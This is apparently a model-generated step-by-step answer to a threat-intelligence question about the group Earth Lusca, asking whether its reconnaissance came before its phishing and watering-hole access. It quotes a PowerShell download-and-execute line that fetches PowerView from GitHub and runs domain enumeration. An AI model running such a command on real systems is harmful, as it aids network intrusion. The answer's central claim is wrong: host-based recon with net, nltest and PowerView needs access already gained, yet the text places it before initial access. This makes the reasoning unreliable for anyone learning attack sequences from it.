### Step-by-Step Analysis

1. **Analyze the CTI Report:**
   - **Reconnaissance:**
     - Earth Lusca used Windows utilities (e.g., `net`, `nltest`, `ipconfig`, `netstat`, `tasklist`) and third-party tools like adfind and PowerSploit to gather information on user accounts, domain controllers, and network configurations.
     - Example command: `powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1');Get-NetComputer -FullData > [file path]`
   - **Initial Access:**
     - Earth Lusca used spear phishing and watering hole attacks.
     - Example: Sent spear phishing emails with malicious links to a target news organization, leading to the download of a malicious LNK file or executable.
     - Example: Compromised websites or created fake web pages with injected malicious JavaScript to deliver malware.

2. **Analyze the Question:**
   - The question asks if it is likely that Earth Lusca gathered network configurations and domain information using Windows utilities and tools like PowerSploit before using spear phishing emails with malicious links or injecting malicious JavaScript into websites to achieve initial access.

3. **Compare and Evaluate:**
   - **Reconnaissance:**
     - The report clearly states that Earth Lusca used Windows utilities and PowerSploit to gather network configurations and domain information.
   - **Initial Access:**
     - The report also states that Earth Lusca used spear phishing and watering hole attacks, which involve sending emails with malicious links or injecting malicious JavaScript into websites.
   - **Sequence:**
     - The reconnaissance activities (gathering network configurations and domain information) logically precede the initial access methods (spear phishing and watering hole attacks) because the threat actor needs to understand the target environment before launching the attack.

4. **Step-by-Step Reasoning:**
   - **Reconnaissance:**
     - Earth Lusca used Windows utilities and PowerSploit to gather information about the target network and domain.
   - **Initial Access:**
     - After gathering the necessary information, Earth Lusca used spear phishing emails with malicious links and watering hole attacks to gain initial access to the target systems.
   - **Logical Sequence:**
     - The reconnaissance phase is a critical first step to understand the target environment, which is necessary before launching the initial access methods.
